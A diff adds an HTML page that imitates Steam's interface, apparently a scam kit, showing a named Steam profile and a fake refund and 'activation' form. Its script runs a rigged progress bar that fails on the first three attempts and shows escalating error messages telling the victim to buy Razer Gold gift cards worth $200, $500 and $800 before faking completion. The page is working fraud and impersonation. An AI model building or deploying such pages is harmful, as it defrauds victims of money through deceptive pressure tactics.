@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>BADING KA!!</title>
+<link rel="shortcut icon" href="https://avatars.akamai.steamstatic.com/e1dd59fdefd14c7e2b9f0cad71500ec25ee880d5_full.jpg" type="image/x-icon">
+
+<style>
+body{
+    margin:0;
+    font-family: Arial, Helvetica, sans-serif;
+    background:#1b2838;
+    color:#c7d5e0;
+}
+
+.container{
+    width:600px;
+    margin:80px auto;
+}
+
+/* PROFILE */
+.profile-box{
+    background:linear-gradient(180deg,#16202d 0%, #101822 100%);
+    padding:15px;
+    border-radius:8px;
+    display:flex;
+    align-items:center;
+    margin-bottom:20px;
+    border:1px solid #000;
+}
+
+.profile-box img{
+    width:60px;
+    height:60px;
+    border-radius:6px;
+    margin-right:15px;
+}
+
+/* REFUND BOX */
+.refund-box{
+    background:linear-gradient(180deg,#16202d 0%, #101822 100%);
+    padding:25px;
+    border-radius:8px;
+    box-shadow:0 0 15px rgba(0,0,0,0.7);
+    border:1px solid #000;
+}
+
+/* SHAKE */
+@keyframes shake {
+  0% { transform: translateX(0); }
+  25% { transform: translateX(-8px); }
+  50% { transform: translateX(8px); }
+  75% { transform: translateX(-6px); }
+  100% { transform: translateX(0); }
+}
+
+.shake{
+    animation: shake 0.4s;
+}
+
+/* Spinner */
+.spinner{
+    display:none;
+    margin:20px auto;
+    width:35px;
+    height:35px;
+    border:4px solid #1a2a3a;
+    border-top:4px solid #66c0f4;
+    border-radius:50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0%{ transform:rotate(0deg); }
+    100%{ transform:rotate(360deg); }
+}
+
+/* Progress */
+.progress{
+    background:#0e141b;
+    border-radius:4px;
+    overflow:hidden;
+    margin:20px 0;
+    border:1px solid #000;
+}
+
+.progress-bar{
+    width:0%;
+    background:linear-gradient(to right,#4c91c2,#66c0f4);
+    padding:7px;
+    text-align:center;
+    font-size:13px;
+    color:#000;
+    font-weight:bold;
+    transition: width 0.1s linear;
+}
+
+.progress-stop{
+    background:linear-gradient(to right,#ff4d4d,#cc0000);
+    color:white;
+}
+
+/* Inputs */
+.input-group{
+    margin-bottom:20px;
+}
+
+.input-group label{
+    display:block;
+    margin-bottom:6px;
+    font-size:14px;
+    color:#8f98a0;
+}
+
+.amount-wrapper{
+    position:relative;
+}
+
+.amount-wrapper span{
+    position:absolute;
+    left:12px;
+    top:9px;
+    color:#8f98a0;
+}
+
+.amount-wrapper input{
+    width:93%;
+    padding:9px 9px 9px 28px;
+    border-radius:3px;
+    border:1px solid #000;
+    background:#0e141b;
+    color:white;
+}
+
+select{
+    width:100%;
+    padding:9px;
+    border-radius:3px;
+    border:1px solid #000;
+    background:#0e141b;
+    color:white;
+}
+
+/* Button */
+button{
+    width:100%;
+    padding:12px;
+    border:none;
+    border-radius:3px;
+    background:linear-gradient(to bottom,#75c7ff,#4fa3d1);
+    color:#000;
+    font-weight:bold;
+    cursor:pointer;
+}
+
+/* ERROR BOX */
+.error-box{
+    display:none;
+    background:#5c0000;
+    border:1px solid #ff1a1a;
+    color:#ffd6d6;
+    padding:12px;
+    border-radius:5px;
+    margin-top:15px;
+    font-size:14px;
+    box-shadow:0 0 8px rgba(255,0,0,0.6);
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="profile-box">
+<img src="https://avatars.akamai.steamstatic.com/e1dd59fdefd14c7e2b9f0cad71500ec25ee880d5_full.jpg">
+<div>
+<div style="font-weight:bold;color:white;">GalacticStorm </div>
+<div style="font-size:13px;color:#8f98a0;">Steam ID: 76561198967678361</div>
+</div>
+</div>
+
+<div class="refund-box" id="refundBox">
+
+<h2>Activation Process</h2>
+
+<div style="color:#66c0f4;margin-bottom:20px;">
+Add funds: <b>$100.00</b>
+</div>
+
+<div class="input-group" id="cardholderGroup" style="display:none;">
+<label>Cardholder's Name</label>
+<input type="text" placeholder="Enter cardholder name">
+</div>
+
+<div class="input-group">
+<label>Refund Amount</label>
+<div class="amount-wrapper">
+<span>$</span>
+<input type="number" placeholder="Enter amount">
+</div>
+</div>
+
+<div class="input-group">
+<label>Refund Method</label>
+<select id="refundMethod" onchange="toggleCardholder()">
+<option>PayPal</option>
+<option>Visa</option>
+<option>MasterCard</option>
+<option>Discover</option>
+<option>American Express</option>
+</select>
+</div>
+
+<div class="progress">
+<div class="progress-bar" id="progressBar">0%</div>
+</div>
+
+<button onclick="submitRefund()">Submit Refund Request</button>
+
+<div class="spinner" id="spinner"></div>
+
+<div class="error-box" id="errorBox">
+⚠ Error: Unable to process refund. Please try again later.
+</div>
+
+</div>
+</div>
+
+<script>
+let attempt = 0;
+
+function submitRefund(){
+
+    const spinner = document.getElementById("spinner");
+    const errorBox = document.getElementById("errorBox");
+    const refundBox = document.getElementById("refundBox");
+    const progressBar = document.getElementById("progressBar");
+
+    attempt++;
+
+    // Reset UI
+    spinner.style.display = "block";
+    errorBox.style.display = "none";
+
+    progressBar.classList.remove("progress-stop");
+    progressBar.style.background = "linear-gradient(to right,#4c91c2,#66c0f4)";
+    progressBar.style.width = "0%";
+    progressBar.innerText = "0%";
+
+    let progress = 0;
+
+    // Stop points per attempt
+    let stopPoint = null;
+
+    if(attempt === 1) stopPoint = 37;
+    else if(attempt === 2) stopPoint = 54;
+    else if(attempt === 3) stopPoint = 92;
+
+    const errorMessages = [
+        "⚠ ERROR: We cannot retrieve your Steam account since there is missing information that prevents the database from retrieving your Steam account. You need to add $200 Razer Gold gift card more to process.",
+        "⚠ ERROR: The database has already found the missing information. We must increase your market transaction; that is why you need to buy another set of Razer Gold gift cards worth $500. We are doing this so that your account will be immune to this case anymore.",
+        "⚠ ERROR: Security confirmation required. The System need you to buy $800 card to fix the Item Buying Process Data in your Steam account. However, there is a problem regarding the Item Buying Process Data on your Steam account. As such, your account is not capable of performing any transactions on Steam, such as trading, buying in the market, or purchasing in-game items."
+    ];
+
+    function updateProgress(){
+
+        // ----- FAIL STOP -----
+        if(stopPoint !== null && progress >= stopPoint){
+
+            spinner.style.display = "none";
+
+            progressBar.classList.add("progress-stop");
+            progressBar.style.background = "linear-gradient(to right,#ff4d4d,#cc0000)";
+            progressBar.style.width = stopPoint + "%";
+            progressBar.innerText = stopPoint + "%";
+
+            errorBox.textContent = errorMessages[attempt - 1];
+            errorBox.style.display = "block";
+
+            refundBox.classList.add("shake");
+            setTimeout(() => refundBox.classList.remove("shake"), 400);
+
+            return;
+        }
+
+        // ----- SUCCESS AFTER 3 FAILS -----
+        if(attempt >= 4 && progress >= 100){
+
+            spinner.style.display = "none";
+
+            progressBar.style.background = "linear-gradient(to right,#2ecc71,#27ae60)";
+            progressBar.style.width = "100%";
+            progressBar.innerText = "Completed";
+
+            return;
+        }
+
+        // Continue progress
+        progress++;
+        progressBar.style.width = progress + "%";
+        progressBar.innerText = progress + "%";
+
+        // Slow near stop
+        let delay = 20;
+        if(stopPoint !== null){
+            if(progress > stopPoint - 10) delay = 70;
+            if(progress > stopPoint - 4) delay = 140;
+        }
+
+        setTimeout(updateProgress, delay);
+    }
+
+    updateProgress();
+}
+function toggleCardholder(){
+    const method = document.getElementById("refundMethod").value;
+    const cardholder = document.getElementById("cardholderGroup");
+
+    if(method === "Visa" || method === "MasterCard" || method === "Discover" || method === "American Express"){ 
+        cardholder.style.display = "block";
+    } else {
+        cardholder.style.display = "none";
+    }
+}
+</script>
+
+</body>
+</html>
